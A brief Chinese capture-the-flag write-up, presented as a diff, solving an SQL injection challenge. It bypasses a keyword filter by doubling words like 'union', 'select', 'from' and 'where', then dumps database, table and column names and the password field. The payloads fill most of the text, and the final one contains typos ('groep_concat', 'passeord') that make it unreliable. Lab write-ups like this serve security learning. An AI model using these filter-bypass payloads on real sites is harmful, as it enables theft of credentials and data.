@@ -1,0 +1,38 @@
+本题为sql注入
+题目难点在于对一些字符进行了过滤
+例如 union select and or where
+
+闭合单引号发现有注入点
+
+%23注释掉passwd 登录成功
+
+查询字段数 
+admin' order by 1%23
+报错根据语句看发现过滤，双写
+admin' oorrder by 1%23
+直到4报错 column数量不符
+得知是三个字段
+
+查询回显点
+1' union select 2,3,4 %23
+发现过滤,双写
+1' ununionion selselectect 2,3,4 %23
+发现3,4可以回显
+
+查看数据库名称
+1' ununionion selselectect 2,3,database() %23
+result:geek
+
+查看表名
+继续双写
+1' ununionion selselectect 2,3,group_concat(table_name) frfromom infoorrmation_schema.tables whewherere table_schema=database() %23
+result: b4bsql,geekuser
+
+查看字段名
+1' uniunionon selselectect 1,2,group_concat(column_name) frfromom infoorrmation_schema.columns whwhereere table_schema=database() anandd table_name='b4bsql' %23
+
+result: id username password 
+
+查询字段内容
+1' ununionion selselectect 1,2,groep_concat(passeord) frfromom geek.b4bsql %23
+得到flag
